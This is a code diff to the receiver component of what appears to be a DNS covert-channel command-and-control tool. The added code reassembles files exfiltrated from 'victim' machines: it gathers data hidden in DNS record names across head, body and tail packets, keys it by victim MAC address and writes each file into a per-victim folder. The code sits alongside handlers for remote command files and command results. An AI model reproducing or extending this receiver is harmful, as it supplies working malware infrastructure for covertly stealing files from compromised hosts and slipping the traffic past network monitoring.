@@ -17,6 +17,8 @@ class DataReceiver():
         self.cmd_file = cmd_file
         self.queue = queue
 
+        self.file_transfer = dict()
+
     def parse(self, pkt):
         # Check qtype field to delineate type of given packet
         if pkt.getlayer(DNSQR).qtype == RequestType.PING:
@@ -61,11 +63,27 @@ class DataReceiver():
 
         # Determine if it is a head, body, or tail packet
         if dnsqr_layer.qclass == DataRequestType.HEAD:
-            
+            # Create entry, parse DNSRR.rrname
+            self.file_transfer[str(victim_mac)] = ''
         elif dnsqr_layer.qclass == DataRequestType.NORMAL:
-
-        elif dnsqr_layer.qlcass == DataRequestType.TAIL:
+            dnsrr_layer = pkt.getlayer(DNSRR)
             
+            buffer = ''
+            fields = dnsrr_layer.rrname[:-1].split('.') # There is a trailing period
+            for i in range(1, len(fields) - 3):
+                buffer += fields[i]
+
+            self.file_transfer[str(victim_mac)] += buffer
+        elif dnsqr_layer.qclass == DataRequestType.TAIL:
+            # Write to file from buffer
+            victim_dir = self.rel_path + str(victim_mac)
+            fields = dnsqr_layer.qname[:-1].split('.') # There is a trailing period
+            file_name = fields[-2] + '.' + fields[-1]
+            print(pkt.getlayer(DNSQR).qname)
+            print(file_name)
+            with open(victim_dir + '/files/' + file_name, 'w+') as f:
+                f.write(self.file_transfer[str(victim_mac)])
+
 
     def _receive_recpt(self, pkt):
         """Process RECPT request from the client and writes out result of command to file
